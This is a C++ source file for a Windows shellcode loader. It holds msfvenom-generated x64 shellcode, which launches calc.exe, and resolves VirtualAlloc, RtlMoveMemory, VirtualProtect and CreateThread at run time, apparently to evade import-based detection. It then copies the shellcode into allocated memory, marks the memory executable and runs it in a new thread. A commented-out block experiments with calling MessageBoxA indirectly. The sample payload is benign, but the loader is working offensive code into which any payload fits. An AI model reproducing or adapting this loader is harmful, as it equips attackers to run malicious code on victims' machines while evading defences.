
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string.h>

using namespace std;

typedef LPVOID(WINAPI* VirtualAllocRunTimeFunction)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL(WINAPI* VirtualProtectRunTimeFunction)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef void(WINAPI* RtlMoveMemoryRunTimeFunction)(void UNALIGNED *, void UNALIGNED * , SIZE_T);
typedef HANDLE(WINAPI* CreateThreadRunTimeFunction)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID,DWORD,LPWORD);
typedef DWORD(WINAPI* WaitForSingleObjectRunTimeFunction)(HANDLE , DWORD  );

int main() {
	HINSTANCE RTDll = LoadLibrary(L"kernel32.dll");
	DWORD oldprotect = 0;
	//ShellCode Stored in .text section in PE [Local Variable]
	// msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp i xor/dynamic

	
	
unsigned char ShellCode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00 };
unsigned int payload_len = sizeof(ShellCode);

//#define MEM_COMMIT                      0x00001000  
//#define MEM_RESERVE                     0x00002000  
//#define PAGE_READWRITE			      0x04   
//#define PAGE_EXECUTE_READ				  0x20    




	VirtualAllocRunTimeFunction HookedVirtualAlloc     =		   (VirtualAllocRunTimeFunction)   GetProcAddress(RTDll, "VirtualAlloc");
	void* exec_mem = HookedVirtualAlloc(0, payload_len, 0x1000 | 0x2000, 0x04);
	printf("%-20s : 0x%-016p\n", "payload addr", (void*)ShellCode);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);



	RtlMoveMemoryRunTimeFunction HookedRtlMoveMemory = (RtlMoveMemoryRunTimeFunction)GetProcAddress(RTDll, "RtlMoveMemory");
	HookedRtlMoveMemory(exec_mem, ShellCode, payload_len);
	printf("Payload Moved To memory");


	VirtualProtectRunTimeFunction HookedVirtualProtect =		   (VirtualProtectRunTimeFunction)GetProcAddress(RTDll, "VirtualProtect");
	BOOL rv = HookedVirtualProtect(exec_mem, payload_len, 0x20, &oldprotect);
	if (rv) {
		printf("\nShellCode Injected Succefully!\n");
	}



	CreateThreadRunTimeFunction HookedCreateThread     =		   (CreateThreadRunTimeFunction)	GetProcAddress(RTDll, "CreateThread");
	HANDLE th = HookedCreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);



	WaitForSingleObjectRunTimeFunction HookedWaitForSingleObject = (WaitForSingleObjectRunTimeFunction)GetProcAddress(RTDll, "WaitForSingleObject");
	HookedWaitForSingleObject(th, -1);

	getchar();

	return 0;
}


  //  typedef int(WINAPI* MSGBOXRunTimeFunction)(HWND, LPCSTR, LPCSTR, UINT);
  //  HINSTANCE RTDll = LoadLibrary(L"user32.dll");

  //  
  //
  //  MSGBOXRunTimeFunction HookedMessageBox = (MSGBOXRunTimeFunction)   GetProcAddress(RTDll, "MessageBoxA");
  //  std::cout << "Function Address in Memory is : " << HookedMessageBox;
  //  Sleep(1000);
  //  HookedMessageBox(NULL, "calling MessageBoxA undirectly", "kek", MB_OK);

  ////auto Loaded = (* MessageBox )GetProcAddress(RTDll, "MessageBoxA")
  //  //Error Debugging
  //  if (!HookedMessageBox) {
  //      printf("could not locate the function ");
  //      printf("%d", GetLastError());
  //  }
  //  
  //  cin.get();






    




